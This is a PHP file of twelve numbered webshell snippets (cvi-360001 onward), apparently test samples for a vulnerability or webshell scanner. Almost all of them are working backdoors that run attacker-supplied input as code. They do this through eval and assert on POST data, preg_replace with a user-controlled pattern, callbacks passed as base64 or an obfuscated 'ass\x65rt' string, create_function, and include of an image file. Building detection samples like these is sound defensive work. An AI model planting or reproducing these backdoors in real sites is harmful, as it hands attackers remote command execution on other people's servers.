<?php
//cvi-360001
eval($_POST['C']);

//cvi-360002
$a="ss";
include("sss.jpg");

//cvi-360003
echo '###m7lrvok###';$a=$_POST['m7lrv'];$b;$b=$a;@eval($a)

//cvi-360004
$string = 'AABBCCDDEE';
preg_replace($_POST['A'], $_POST['B'], $string);

//cvi-360005 ?????
$a = $_POST['A']; preg_replace($a, $_POST['B'], $string);

//cvi-360006   换行就挂
$b = $_POST['B'];  preg_replace($_POST['A'], $b, $string);

//cvi-360007
array_map("ass\x65rt",(array)$_REQUEST['expdoor']);

//cvi-360008

//cvi-360009
$e = $_REQUEST['e'];
$arr = array($_POST['pass'],);
array_filter($arr, base64_decode($e));

//cvi-360010  换行就挂
$e = $_REQUEST['e'];$arr = array($_POST['pass'],);array_filter($arr, base64_decode($e));

//cvi-360011  换行就挂
$newfunc = create_function(null,'assert($_POST[c]);');$newfunc();

//cvi-360012  换行就挂
$newfunc = create_function('str','return str');$newfunc("$_POST['c']");
?>

